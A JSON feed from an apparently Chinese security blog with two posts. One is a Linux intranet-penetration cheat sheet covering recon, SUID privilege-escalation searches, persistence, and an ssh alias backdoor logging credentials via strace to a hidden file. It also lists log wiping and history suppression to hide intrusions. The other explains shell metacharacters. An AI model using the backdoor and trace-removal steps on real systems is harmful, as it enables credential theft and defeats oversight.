{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"linux\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "title": "Linux内网渗透",
            "date_published": "2022-11-28T13:35:20.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"获取内核操作系统和设备信息\"><a class=\"anchor\" href=\"#获取内核操作系统和设备信息\">#</a> 获取内核，操作系统和设备信息</h2>\n<ul>\n<li>\n<p>版本信息</p>\n<ul>\n<li><code>uname -a</code>  所有版本</li>\n<li><code>uname -r</code>  内核版本信息</li>\n<li><code>uname -n</code>  系统主机名字</li>\n<li><code>uname -m</code>  Linux 内核架构</li>\n</ul>\n</li>\n<li>\n<p>内核信息  <code>cat /proc/version</code></p>\n</li>\n<li>\n<p>CPU 信息  <code>cat /proc/cpuinfo</code></p>\n</li>\n<li>\n<p>发布信息</p>\n<ul>\n<li><code>cat /etc/*-release</code></li>\n<li><code>cat /etc/issue</code></li>\n</ul>\n</li>\n<li>\n<p>主机名  <code>hostname</code></p>\n</li>\n<li>\n<p>文件系统  <code>df -a</code></p>\n</li>\n<li>\n<p>内核日志  <code>dmesg</code>  /  <code>/var/log/dmesg</code></p>\n</li>\n</ul>\n<h2 id=\"用户和组\"><a class=\"anchor\" href=\"#用户和组\">#</a> 用户和组</h2>\n<ul>\n<li>\n<p>列出系统所有用户  <code>cat /etc/passwd</code></p>\n</li>\n<li>\n<p>列出系统所有组  <code>cat /etc/group</code></p>\n</li>\n<li>\n<p>列出所有用户 hash（root） <code>cat /etc/shadow</code></p>\n</li>\n<li>\n<p>用户</p>\n<ul>\n<li>查询用户的基本信息  <code>finger</code></li>\n<li>当前登录的用户  <code>users</code>   <code>who -a</code>   <code>/var/log/utmp</code></li>\n<li>查询无密码用户  <code>grep 'x:0:' /etc/passwd</code></li>\n</ul>\n</li>\n<li>\n<p>目前登录的用户  <code>w</code></p>\n</li>\n<li>\n<p>登入过的用户信息  <code>last</code>  /  <code>/var/log/wtmp</code></p>\n</li>\n<li>\n<p>显示系统中所有用户最近一次登录信息  <code>lastlog</code>  /  <code>/var/log/lastlog</code></p>\n</li>\n<li>\n<p>登录成功日志  <code>/var/log/secure</code></p>\n</li>\n<li>\n<p>登录失败日志  <code>/var/log/faillog</code></p>\n</li>\n<li>\n<p>查看特权用户  <code>grep :0 /etc/passwd</code></p>\n</li>\n<li>\n<p>查看 passwd 最后修改时间  <code>ls -l /etc/passwd</code></p>\n</li>\n<li>\n<p>查看是否存在空口令用户  <code>awk -F: 'length($2)==0 &#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看远程登录的账号  <code>awk '/\\$1|\\$6/&#123;print $1&#125;' /etc/shadow</code></p>\n</li>\n<li>\n<p>查看具有 sudo 权限的用户</p>\n<ul>\n<li><code>cat /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"用户和权限信息\"><a class=\"anchor\" href=\"#用户和权限信息\">#</a> 用户和权限信息</h2>\n<ul>\n<li>当前用户  <code>whoami</code></li>\n<li>当前用户信息  <code>id</code></li>\n<li>可以使用 sudo 提升到 root 的用户（root）  <code>cat /etc/sudoers</code></li>\n<li>列出目前用户可执行与无法执行的指令  <code>sudo -l</code></li>\n</ul>\n<h2 id=\"环境信息\"><a class=\"anchor\" href=\"#环境信息\">#</a> 环境信息</h2>\n<ul>\n<li>打印系统环境信息  <code>env</code></li>\n<li>打印系统环境信息  <code>set</code></li>\n<li>环境变量中的路径信息  <code>echo $PATH</code></li>\n<li>打印历史命令  <code>history</code>  /  <code>~/.bash_history</code></li>\n<li>显示当前路径  <code>pwd</code></li>\n<li>显示默认系统遍历  <code>cat /etc/profile</code></li>\n<li>显示可用的 shell  <code>cat /etc/shells</code></li>\n</ul>\n<h2 id=\"进程信息\"><a class=\"anchor\" href=\"#进程信息\">#</a> 进程信息</h2>\n<ul>\n<li>查看进程信息  <code>ps aux</code></li>\n<li>资源占有情况  <code>top -c</code></li>\n<li>查看进程关联文件  <code>lsof -c $PID</code></li>\n<li>完整命令行信息  <code>/proc/$PID/cmdline</code></li>\n<li>进程的命令名  <code>/proc/$PID/comm</code></li>\n<li>进程当前工作目录的符号链接  <code>/proc/$PID/cwd</code></li>\n<li>运行程序的符号链接  <code>/proc/$PID/exe</code></li>\n<li>进程的环境变量  <code>/proc/$PID/environ</code></li>\n<li>进程打开文件的情况  <code>/proc/$PID/fd</code></li>\n</ul>\n<h2 id=\"服务信息\"><a class=\"anchor\" href=\"#服务信息\">#</a> 服务信息</h2>\n<ul>\n<li>由 inetd 管理的服务列表  <code>cat /etc/inetd.conf</code></li>\n<li>由 xinetd 管理的服务列表  <code>cat /etc/xinetd.conf</code></li>\n<li>nfs 服务器的配置  <code>cat /etc/exports</code></li>\n<li>邮件信息  <code>/var/log/mailog</code></li>\n<li>ssh 配置  <code>sshd_config</code></li>\n</ul>\n<h2 id=\"计划任务\"><a class=\"anchor\" href=\"#计划任务\">#</a> 计划任务</h2>\n<ul>\n<li>显示指定用户的计划作业（root）  <code>crontab -l -u %user%</code></li>\n<li>计划任务\n<ul>\n<li><code>/var/spool/cron/*</code></li>\n<li><code>/var/spool/anacron/*</code></li>\n<li><code>/etc/crontab</code></li>\n<li><code>/etc/anacrontab</code></li>\n<li><code>/etc/cron.*</code></li>\n<li><code>/etc/anacrontab</code></li>\n</ul>\n</li>\n<li>开机启动项\n<ul>\n<li><code>/etc/rc.d/init.d/</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"网络-路由和通信\"><a class=\"anchor\" href=\"#网络-路由和通信\">#</a> 网络、路由和通信</h2>\n<ul>\n<li>列出网络接口信息  <code>/sbin/ifconfig -a</code>  /  <code>ip addr show</code></li>\n<li>列出网络接口信息  <code>cat /etc/network/interfaces</code></li>\n<li>查看系统 arp 表  <code>arp -a</code></li>\n<li>打印路由信息  <code>route</code>  /  <code>ip ro show</code></li>\n<li>查看 dns 配置信息  <code>cat /etc/resolv.conf</code></li>\n<li>打印本地端口开放信息  <code>netstat -an</code></li>\n<li>列出 iptable 的配置规则  <code>iptables -L</code></li>\n<li>查看端口服务映射  <code>cat /etc/services</code></li>\n<li>Hostname  <code>hostname -f</code></li>\n<li>查看进程端口情况  <code>netstat -anltp | grep $PID</code></li>\n</ul>\n<h2 id=\"已安装程序\"><a class=\"anchor\" href=\"#已安装程序\">#</a> 已安装程序</h2>\n<ul>\n<li><code>rpm -qa --last</code>  Redhat</li>\n<li><code>yum list | grep installed</code>  CentOS</li>\n<li><code>ls -l /etc/yum.repos.d/</code></li>\n<li><code>dpkg -l</code>  Debian</li>\n<li><code>cat /etc/apt/sources.list</code>  Debian APT</li>\n<li><code>pkg_info</code>  xBSD</li>\n<li><code>pkginfo</code>  Solaris</li>\n<li><code>pacman -Q</code>  Arch Linux</li>\n<li><code>emerge</code>  Gentoo</li>\n</ul>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<ul>\n<li>最近五天的文件  <code>find / -ctime +1 -ctime -5</code></li>\n<li>文件系统细节  <code>debugfs</code></li>\n</ul>\n<h2 id=\"公私钥信息\"><a class=\"anchor\" href=\"#公私钥信息\">#</a> 公私钥信息</h2>\n<ul>\n<li><code>~/.ssh</code></li>\n<li><code>/etc/ssh</code></li>\n</ul>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<ul>\n<li><code>/var/log/boot.log</code></li>\n<li><code>/var/log/cron</code></li>\n<li><code>/var/log/faillog</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/messages</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/syslog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/run/utmp</code></li>\n</ul>\n<h2 id=\"虚拟环境检测\"><a class=\"anchor\" href=\"#虚拟环境检测\">#</a> 虚拟环境检测</h2>\n<ul>\n<li><code>lsmod | grep -i &quot;vboxsf\\|vboxguest&quot;</code></li>\n<li><code>lsmod | grep -i &quot;vmw_baloon\\|vmxnet&quot;</code></li>\n<li><code>lsmod | grep -i &quot;xen-vbd\\|xen-vnif&quot;</code></li>\n<li><code>lsmod | grep -i &quot;virtio_pci\\|virtio_net&quot;</code></li>\n<li><code>lsmod | grep -i &quot;hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc&quot;</code></li>\n</ul>\n<h2 id=\"容器内信息收集\"><a class=\"anchor\" href=\"#容器内信息收集\">#</a> 容器内信息收集</h2>\n<ul>\n<li><code>capsh --print</code></li>\n<li><code>cat /proc/1/cgroup</code></li>\n<li><code>env | grep KUBE</code></li>\n<li><code>ls -l .dockerenv</code></li>\n<li><code>ls -l /run/secrets/Kubernetes.io/</code></li>\n<li><code>mount</code></li>\n<li><code>ps aux</code></li>\n</ul>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<ul>\n<li>内核漏洞利用</li>\n<li>攻击有 root 权限的服务</li>\n<li>利用第三方服务提权</li>\n<li>通过有 SUID 属性的可执行文件\n<ul>\n<li>查找可能提权的可执行文件</li>\n<li><code>find / -perm +4000 -ls</code></li>\n<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li>\n<li><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \\; 2&gt;/dev/null</code></li>\n</ul>\n</li>\n<li>利用可用的 root 权限\n<ul>\n<li><code>sudo -l</code></li>\n</ul>\n</li>\n<li>利用误配置的 crontab 任务</li>\n</ul>\n<h2 id=\"自启动\"><a class=\"anchor\" href=\"#自启动\">#</a> 自启动</h2>\n<ul>\n<li>/etc/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n<li>~/.bashrc</li>\n<li>~/.zshrc</li>\n</ul>\n<h2 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h2>\n<ul>\n<li>ssh 后门\n<ul>\n<li><code>alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'</code></li>\n<li>后门账户</li>\n</ul>\n</li>\n<li>常见应用\n<ul>\n<li>ICMP</li>\n<li>DNS</li>\n</ul>\n</li>\n<li>icmp 后门</li>\n<li>后门端口复用</li>\n<li><code>.</code>  开头隐藏文件</li>\n<li>rootkit</li>\n</ul>\n<h1 id=\"痕迹清理\"><a class=\"anchor\" href=\"#痕迹清理\">#</a> 痕迹清理</h1>\n<h2 id=\"历史命令\"><a class=\"anchor\" href=\"#历史命令\">#</a> 历史命令</h2>\n<ul>\n<li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li>\n<li><code>kill -9 $$</code>  kill history</li>\n<li><code>history -c</code></li>\n<li>在  <code>HISTSIZE=0</code>  中设置  <code>HISTSIZE=0</code></li>\n</ul>\n<h2 id=\"清除修改日志文件\"><a class=\"anchor\" href=\"#清除修改日志文件\">#</a> 清除 / 修改日志文件</h2>\n<ul>\n<li><code>/var/log/btmp</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/utmp</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/message</code></li>\n</ul>\n<h2 id=\"登录痕迹\"><a class=\"anchor\" href=\"#登录痕迹\">#</a> 登录痕迹</h2>\n<ul>\n<li>删除  <code>~/.ssh/known_hosts</code>  中记录</li>\n<li>修改文件时间戳\n<ul>\n<li><code>touch –r</code></li>\n</ul>\n</li>\n<li>删除 tmp 目录临时文件</li>\n</ul>\n<h2 id=\"操作痕迹\"><a class=\"anchor\" href=\"#操作痕迹\">#</a> 操作痕迹</h2>\n<ul>\n<li>vim 不记录历史命令  <code>:set history=0</code></li>\n<li>ssh 登录痕迹\n<ul>\n<li>无痕登录  <code>ssh -T user@host /bin/bash -i</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"覆写文件\"><a class=\"anchor\" href=\"#覆写文件\">#</a> 覆写文件</h2>\n<ul>\n<li>shred</li>\n<li>dd</li>\n<li>wipe</li>\n</ul>\n<h2 id=\"难点\"><a class=\"anchor\" href=\"#难点\">#</a> 难点</h2>\n<ul>\n<li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li>\n<li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li>\n<li>留存的后门包含攻击者的信息</li>\n<li>使用的代理或跳板可能会被反向入侵</li>\n</ul>\n<h2 id=\"注意\"><a class=\"anchor\" href=\"#注意\">#</a> 注意</h2>\n<ul>\n<li>在操作前检查是否有用户在线</li>\n<li>删除文件使用磁盘覆写的功能删除</li>\n<li>尽量和攻击前状态保持一致</li>\n</ul>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTJXdkZtRjFxUWpieC1CYVN0WGIxUQ==\">Linux 入侵痕迹清理技巧</span></li>\n</ul>\n",
            "tags": [
                "Linux",
                "渗透",
                "信息收集",
                "痕迹清理"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/",
            "title": "Shell",
            "date_published": "2022-11-28T02:48:11.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。</p>\n<p>Linux 包含多种 Shell ，常见的有：</p>\n<ul>\n<li>Bourne Shell（ATT 的 Bourne 开发，名为 sh）</li>\n<li>Bourne Again Shell（/bin/bash）</li>\n<li>C Shell（Bill Joy 开发，名为 csh）</li>\n<li>K Shell（ATT 的 David G.koun 开发，名为 ksh）</li>\n<li>Z Shell（Paul Falstad 开发，名为 zsh）</li>\n</ul>\n<h1 id=\"元字符\"><a class=\"anchor\" href=\"#元字符\">#</a> 元字符</h1>\n<p>shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。</p>\n<p>常见的元字符如下：</p>\n<ul>\n<li><code>IFS</code>  由 &lt;space&gt; 或 &lt;tab&gt; 或 &lt;enter&gt; 三者之一组成</li>\n<li><code>CR</code>  由 &lt;enter&gt; 产生。</li>\n<li><code>=</code>  设定变量</li>\n<li><code>$</code>  作变量或运算替换</li>\n<li><code>&gt;</code>  重定向 stdout</li>\n<li><code>&gt;&gt;</code>  追加到文件</li>\n<li><code>&lt;</code>  重定向 stdin</li>\n<li><code>|</code>  命令管道</li>\n<li><code>&amp;</code>  后台执行命令</li>\n<li><code>;</code>  在前一个命令结束后，执行下一个命令</li>\n<li><code>&amp;&amp;</code>  在前一个命令未报错执行后，执行下一个命令</li>\n<li><code>||</code>  在前一个命令执行报错后，执行下一个命令</li>\n<li><code>'</code>  在单引号内的命令会保留原来的值</li>\n<li><code>&quot;</code>  在双引号内的命令会允许变量替换</li>\n<li><code>`</code>  在反引号内的内容会当成命令执行并替换</li>\n<li><code>()</code>  在子 Shell 中执行命令</li>\n<li><code>&#123;&#125;</code>  在当前 Shell 中执行命令</li>\n<li><code>~</code>  当前用户的主目录</li>\n<li><code>!number</code>  执行历史命令，如  <code>!1</code></li>\n</ul>\n<h1 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h1>\n<p>除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。</p>\n<p>常见的通配符如下：</p>\n<ul>\n<li><code>*</code>  匹配 0 或多个字符</li>\n<li><code>?</code>  匹配任意一个字符</li>\n<li><code>[list]</code>  匹配 list 中的任意一个字符</li>\n<li><code>[!list]</code>  匹配除 list 外的任意一个字符</li>\n<li><code>[a-c]</code>  匹配 a-c 中的任意一个字符</li>\n<li><code>&#123;string1,string2,...&#125;</code>  分别匹配其中字符串</li>\n</ul>\n",
            "tags": [
                "Linux",
                "Shell"
            ]
        }
    ]
}